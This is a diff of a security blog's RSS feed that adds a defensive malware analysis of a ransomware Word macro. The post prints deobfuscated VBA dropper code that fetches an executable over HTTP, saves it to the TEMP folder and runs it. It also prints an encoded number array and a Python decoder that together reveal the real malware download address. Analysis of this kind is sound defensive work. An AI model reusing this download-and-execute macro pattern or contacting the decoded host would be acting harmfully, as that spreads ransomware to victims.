@@ -6,9 +6,273 @@
 </description>
     <link>https://spreadsecurity.github.io//</link>
     <atom:link href="https://spreadsecurity.github.io//feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 07 Aug 2016 22:57:15 +0200</pubDate>
-    <lastBuildDate>Sun, 07 Aug 2016 22:57:15 +0200</lastBuildDate>
+    <pubDate>Sun, 14 Aug 2016 11:13:58 +0200</pubDate>
+    <lastBuildDate>Sun, 14 Aug 2016 11:13:58 +0200</lastBuildDate>
     <generator>Jekyll v3.1.6</generator>
+    
+      <item>
+        <title>Macro Malware Analysis</title>
+        <description>&lt;p&gt;Malware, in general, is any kind of malicious program which executes on a machine; it can be used for a large variety of purposes such as influence computer behavior, display ads, steal personal informations, take control of remote machines and so on.&lt;br /&gt;
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Ransomware&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Lately a particular category of malware, called ransomware, is spreading aggressively especially through email compaigns.
+This kind of malicious program infects computers by encrypting files and asking for a ransom payment to recover them; attackers send emails to an extensive number of recepients (mass email attack) in order to infect as much machines as possible.&lt;br /&gt;
+They tend to use Social Engineering techniques by writing an attractive email subject and text so as to trick users into opening an attachment or a link.&lt;br /&gt;
+Once the victim opens the downloaded file (which can have different extensions, like “.exe”, “.doc”, “.xls”, “.js”, “.cab”), malware executes and infects the machine by encrypting data with RSA-2048 and AES-128 algorithm. Then, user gets prompted with a screen asking for money in order to receive the key to restore encrypted data.&lt;/p&gt;
+
+&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/macro_malware/ransomware.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Recently, I got my hands on a ransomware variant which exploits Microsoft Office Macro to execute evil code. Of course, this one was attached in an email as a document with “.docm” extension which is the one used for Word documents with macros.&lt;br /&gt;
+Macros are essentially scripts written in VBA (Visual Basic for Applications), a language used inside Office documents for automating frequent tasks and activities. Since they can interact with the system, attackers can use them as a starting point for the attack.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Macro code examination&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Since we are working with Object Linking and Embedding (OLE), which is a Microsoft proprietary technology for compound documents (like the “.docm” we are threating), one possible way to start analyzing this kind of file is using a very nice utility called &lt;strong&gt;oledump&lt;/strong&gt;: &lt;a href=&quot;https://blog.didierstevens.com/programs/oledump-py&quot;&gt;https://blog.didierstevens.com/programs/oledump-py&lt;/a&gt;.&lt;br /&gt;
+This tool allows to extract macro code so we can take a look at the source; we can launch the program and insert as input argument our “.docm” file which I have renamed “malware.docm”:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/oledump_V0_0_25# ./oledump.py malware.docm 
+A: word/vbaProject.bin
+ A1:       419 &#39;PROJECT&#39;
+ A2:        65 &#39;PROJECTwm&#39;
+ A3: M   23316 &#39;VBA/Module1&#39;
+ A4: M    1347 &#39;VBA/ThisDocument&#39;
+ A5:      4445 &#39;VBA/_VBA_PROJECT&#39;
+ A6:      1204 &#39;VBA/__SRP_0&#39;
+ A7:       106 &#39;VBA/__SRP_1&#39;
+ A8:       292 &#39;VBA/__SRP_2&#39;
+ A9:       103 &#39;VBA/__SRP_3&#39;
+A10:       572 &#39;VBA/dir&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Oledump returns a list of items describing document structure; we are interested in macro code, i.e. items A3 and A4, where tag M indicates the presence of macros. Once we have identified that the interesting portions are “Module1” (looking at the reported dimensions, this should be the core of the script) and “ThisDocument”, we can extract them with the following commands:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/oledump_V0_0_25# ./oledump.py malware.docm -v -s A3 &amp;gt; Module1
+root@kali:~/oledump_V0_0_25# ./oledump.py malware.docm -v -s A4 &amp;gt; ThisDocument
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We can start by taking a look at “ThisDocument”:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Attribute VB_Name = &quot;ThisDocument&quot;
+Attribute VB_Base = &quot;1Normal.ThisDocument&quot;
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Sub autoopen()
+SAAKASHVILLI_MUDEN &quot;Rastyag&quot;
+End Sub
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Immediately, there is something that catches the attention: in the last three lines there is the “autoopen()”” function, which is used for launching macro execution at the opening of the file; this is a first sign of malware activity.&lt;br /&gt;
+Since there is nothing else here, we can continue the analysis by checking “Module1”. This file is pretty big, but it contains a lot of junk code and uses encryption; this is done for two main reasons: one is to decrease the chances of detection by Antivirus softwares and the other one is to increase difficulty, for a security analyst, of blocking the attack as fast as possible.&lt;br /&gt;
+The code starts with some variables definitions and here I have reported only the useful ones:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Attribute VB_Name = &quot;Module1&quot;
+ 
+Public InTheAfrikaMountainsAreHighDAcdaw As Object
+Public InTheAfrikaMountainsAreHighPLAPEKCwwed As Object
+Public InTheAfrikaMountainsAreHighKSKLAL As Object
+Public InTheAfrikaMountainsAreHighXSAOO() As String
+
+Public InTheAfrikaMountainsAreHighLAKOPPC As String
+Public InTheAfrikaMountainsAreHighPLAPEKC() As String
+Public InTheAfrikaMountainsAreHighUUUKA As String
+
+Public InTheAfrikaMountainsAreHighGMAKO As Object
+Public InTheAfrikaMountainsAreHigh4 As String
+Public InTheAfrikaMountainsAreHigh2 As String
+Public InTheAfrikaMountainsAreHighASALLLP As Variant
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The attacker alternates junk code taken from the web with his malicious code hidden inside, but with a little work we can find what we are interested in.&lt;/p&gt;
+
+&lt;p&gt;Scrolling down the code, there are three portions suggesting there is a basic encryption technique which uses the &lt;em&gt;Replace()&lt;/em&gt; function that has been renamed in &lt;em&gt;GodnTeBabenParama()&lt;/em&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Public Function GodnTeBabenParama(A1 As String, A2 As String, A3 As String) As String
+GodnTeBabenParama = Replace(A1, A2, A3)
+End Function
+
+InTheAfrikaMountainsAreHigh2 = GodnTeBabenParama(&quot;BRREADicroBRRREADoft.XBRREADLHTTPBRRRREADAdodb.BRRREADtrBREADaBRREADBRRRREADBRRREADhBREADll.Appli&quot; _
++ GodnTeBabenParama(&quot;cationBRRRREADWBRRREADcript.BRRREADhBREADllBRRRREADProcBREADBRRREADBRRREADBRRRREADGBREADTBRRRREADTBREADBRREADPBRRRREADTypBREADBRRRREADopBREADnBRRRREADwritTRONponBRRREADBREADBodyBRRRREADBRRREADavBREADtofilBREADBRRRREAD&quot;, &quot;TRON&quot;, &quot;BREADBRRRREADrBREADBRRREAD&quot;) _
++ &quot;\zorginBRRREAD.BREADxBREAD&quot;, &quot;BREAD&quot;, &quot;e&quot;)
+
+InTheAfrikaMountainsAreHigh2 = GodnTeBabenParama(InTheAfrikaMountainsAreHigh2, &quot;BRREAD&quot;, &quot;M&quot;)
+InTheAfrikaMountainsAreHigh2 = GodnTeBabenParama(InTheAfrikaMountainsAreHigh2, &quot;BRRREAD&quot;, &quot;s&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Lastly, these values are put inside an array by using &lt;em&gt;Split()&lt;/em&gt; function:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;InTheAfrikaMountainsAreHighPLAPEKC = Split(InTheAfrikaMountainsAreHigh2, &quot;BRRRREAD&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The result of these substitutions gives a lot of informations since the elements of the array are used in important parts of the code:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;InTheAfrikaMountainsAreHighPLAPEKC(0) = Microsoft.XMLHTTP
+InTheAfrikaMountainsAreHighPLAPEKC(1) = Adodb.streaM
+InTheAfrikaMountainsAreHighPLAPEKC(2) = shell.Application
+InTheAfrikaMountainsAreHighPLAPEKC(3) = Wscript.shell
+InTheAfrikaMountainsAreHighPLAPEKC(4) = Process
+InTheAfrikaMountainsAreHighPLAPEKC(5) = GeT
+InTheAfrikaMountainsAreHighPLAPEKC(6) = TeMP
+InTheAfrikaMountainsAreHighPLAPEKC(7) = Type
+InTheAfrikaMountainsAreHighPLAPEKC(8) = open
+InTheAfrikaMountainsAreHighPLAPEKC(9) = write
+InTheAfrikaMountainsAreHighPLAPEKC(10) = responseBody
+InTheAfrikaMountainsAreHighPLAPEKC(11) = savetofile
+InTheAfrikaMountainsAreHighPLAPEKC(12) = \zorgins.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The last one is really informative since it is the name of an “.exe” file, which is probably the real payload. This means that there should be a part where the file “zorgins.exe” is downloaded and saved to the system.&lt;br /&gt;
+We can then substitute these values everytime they appear in the code so as to decrypt it (look at the comments):&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Set InTheAfrikaMountainsAreHighDAcdaw = CreateObject(InTheAfrikaMountainsAreHighPLAPEKC(0)) # = CreateObject(Microsoft.XMLHTTP)
+Set InTheAfrikaMountainsAreHighPLAPEKCwwed = CreateObject(InTheAfrikaMountainsAreHighPLAPEKC(1)) # = CreateObject(Adodb.streaM)
+Set InTheAfrikaMountainsAreHighGMAKO = CreateObject(InTheAfrikaMountainsAreHighPLAPEKC(2)) # = CreateObject(shell.Application)
+Set InTheAfrikaMountainsAreHigh1DASH1solo = CreateObject(InTheAfrikaMountainsAreHighPLAPEKC(3)) # = CreateObject(Wscript.shell)
+Set InTheAfrikaMountainsAreHighKSKLAL = InTheAfrikaMountainsAreHigh1DASH1solo.Environment(InTheAfrikaMountainsAreHighPLAPEKC(4)) # = CreateObject(Wscript.shell).Environment(Process)
+
+InTheAfrikaMountainsAreHighLAKOPPC = InTheAfrikaMountainsAreHighKSKLAL(InTheAfrikaMountainsAreHighPLAPEKC(6)) # = CreateObject(Wscript.shell).Environment(Process)(TeMP)
+InTheAfrikaMountainsAreHighUUUKA = InTheAfrikaMountainsAreHighLAKOPPC # = CreateObject(Wscript.shell).Environment(Process)(TeMP)
+InTheAfrikaMountainsAreHighUUUKA = InTheAfrikaMountainsAreHighUUUKA + InTheAfrikaMountainsAreHighPLAPEKC(12) # = CreateObject(Wscript.shell).Environment(Process)(TeMP)\zorgins.exe
+InTheAfrikaMountainsAreHighGMAKO.Open (InTheAfrikaMountainsAreHighUUUKA) # = CreateObject(shell.Application).Open (CreateObject(Wscript.shell).Environment(Process)(TeMP)\zorgins.exe)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;It is clear now that zorgins.exe is saved in TEMP directory; moreover in the following snippet we have the HTTP GET request for a url (malware download) which is marked as “InTheAfrikaMountainsAreHigh4”:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;InTheAfrikaMountainsAreHighDAcdaw.Open InTheAfrikaMountainsAreHighPLAPEKC(5), InTheAfrikaMountainsAreHigh4, False # = CreateObject(Microsoft.XMLHTTP).Open GeT, InTheAfrikaMountainsAreHigh4, False
+InTheAfrikaMountainsAreHighDAcdaw.Send # = CreateObject(Microsoft.XMLHTTP).Send
+
+InTheAfrikaMountainsAreHighASALLLP = InTheAfrikaMountainsAreHighDAcdaw.responseBody # = CreateObject(Microsoft.XMLHTTP).responseBody
+InTheAfrikaMountainsAreHighPLAPEKCwwed.Write InTheAfrikaMountainsAreHighASALLLP # = CreateObject(Adodb.streaM).Write CreateObject(Microsoft.XMLHTTP).responseBody
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Moving through the code, there is an strange series of numbers separated by the string “112112112112” and saved in the array “InTheAfrikaMountainsAreHighXSAOO”:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;InTheAfrikaMountainsAreHighXSAOO = Split(&quot;634411211211211270761121121121127076112112112112683211211211211235381121121121122867112112112112286711211211211272591121121121127259112112112112725911211211211228061121121121126832112112112112695411211211211264051121121121127015112112112112664911211211211259171121121121122745112112112112701511211211211269541121121121126588112112112112280611211211211267101121121121126161112112112112707611211211211228671121121121122928112112112112347711211211211271371121121121126344112112112112341611211211211267101121121121127381&quot;, &quot;112112112112&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Taking a look at where this variable is used, we find this interesting function:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Public Function DuBirMahnWeishr(InTheAfrikaMountainsAreHigh6 As Integer) As String
+Dost = CInt(InTheAfrikaMountainsAreHighXSAOO(InTheAfrikaMountainsAreHigh6))
+DuBirMahnWeishr = Chr(Dost / 61)
+End Function
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;which is then used here:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;For apdistance = LBound(InTheAfrikaMountainsAreHighXSAOO) To UBound(InTheAfrikaMountainsAreHighXSAOO)
+ InTheAfrikaMountainsAreHigh4 = InTheAfrikaMountainsAreHigh4 &amp;amp; DuBirMahnWeishr(apdistance)
+ Next apdistance
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;It performs a computation by dividing each value of the array “InTheAfrikaMountainsAreHighXSAOO” by 61, converting the value to the corrensponding character using function &lt;em&gt;Chr()&lt;/em&gt; and saving the results in “InTheAfrikaMountainsAreHigh4”, that is the variable seen before representing malware download url.&lt;br /&gt;
+Converting the first values we get:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# python
+&amp;gt;&amp;gt;&amp;gt; chr(6344/61)
+&#39;h&#39;
+&amp;gt;&amp;gt;&amp;gt; chr(7076/61)
+&#39;t&#39;
+&amp;gt;&amp;gt;&amp;gt; chr(6832/61)
+&#39;p&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This looked promising, so I have written a simple Python script that performs the conversion:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;encrypted_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6344&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7076&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7076&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6832&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3538&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2867&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2867&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7259&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7259&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7259&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2806&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6832&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6954&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7015&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6649&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5917&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2745&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7015&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6954&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6588&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2806&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6710&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6161&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7076&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2867&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2928&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3477&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7137&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6344&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3416&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6710&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7381&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;decrypted_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;Malware download address: &#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decrypted_address&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;After running the script we get the decrypted value:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/macro_malware/decrypt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As I thought, that string was hiding the address used by the macro to download the real payload which is then saved in the temporary directory as “zorgins.exe”; once it executes, it starts encrypting files on the machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Sandbox dynamic analysis&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;As a confirmation of what we have found, we can upload the file on the following website: &lt;a href=&quot;https://www.hybrid-analysis.com/&quot;&gt;https://www.hybrid-analysis.com/&lt;/a&gt;.&lt;br /&gt;
+Hybrid Analysis is powered by Payload Security and offers a free service which performs both static and dynamic (behavioral) analysis by interacting with VirusTotal (a free virus, malware and URL online scanning service which uses more than 40 antivirus solutions to execute static analysis), Metadefender (similar to VirusTotal) and running samples in VxStream Sandbox.&lt;/p&gt;
+
+&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/vxstream_sandbox.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/vxstream_sandbox.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Once the analysis is complete it reports results back to the user, showing also screenshots saved during the execution:&lt;/p&gt;
+
+&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/sandbox_execution1.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/sandbox_execution1.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/sandbox_execution2.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/sandbox_execution2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Analyzing the report we can verify that informations found during the reverse engineering activity coincide with the results returned after sandbox execution.&lt;/p&gt;
+
+&lt;p&gt;Usage of function &lt;em&gt;AutoOpen()&lt;/em&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/macro_malware/autoopen.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/autoopen.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Name of dropped malware and download url including spawned processes:&lt;/p&gt;
+
+&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/data_verification.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/data_verification.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/hybrid_analysis.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/hybrid_analysis.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Going deeper&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The analysis performed gives us even more informations such as malicious hosts related to malware download IP address:&lt;/p&gt;
+
+&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/malicious_hosts_ip_related.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/malicious_hosts_ip_related.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;This helps us making further analysis: the service reports that even other websites associated to that IP address are flagged as malicious; in fact, from those addresses it is pretty clear the attacker has compromised legitimate sites and he is now using them to host malware and to carry on phishing activities (look for example at Paypal reference on the last url).&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Remediation&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Once we know the malware download address we can block it by putting the IP address of the website in Firewall/IPS blacklist. A more drastic solution is to create a new rule on the mail server/Antispam blocking all attachments with extension “.docm”.&lt;/p&gt;
+
+&lt;p&gt;Anyway for this type of attacks the best defence is awareness: informing users of possible scams like this one is the best countermeasure you can ever implement.&lt;/p&gt;
+</description>
+        <pubDate>Sun, 14 Aug 2016 00:00:00 +0200</pubDate>
+        <link>https://spreadsecurity.github.io//2016/08/14/macro-malware-analysis.html</link>
+        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/08/14/macro-malware-analysis.html</guid>
+        
+        <category>malware</category>
+        
+        <category>ransomware</category>
+        
+        <category>office macro</category>
+        
+        <category>reverse engineering</category>
+        
+        <category>decryption</category>
+        
+        <category>sandbox</category>
+        
+        <category>dynamic analysis</category>
+        
+        
+      </item>
     
       <item>
         <title>Open source web reconnaissance with Recon-ng</title>
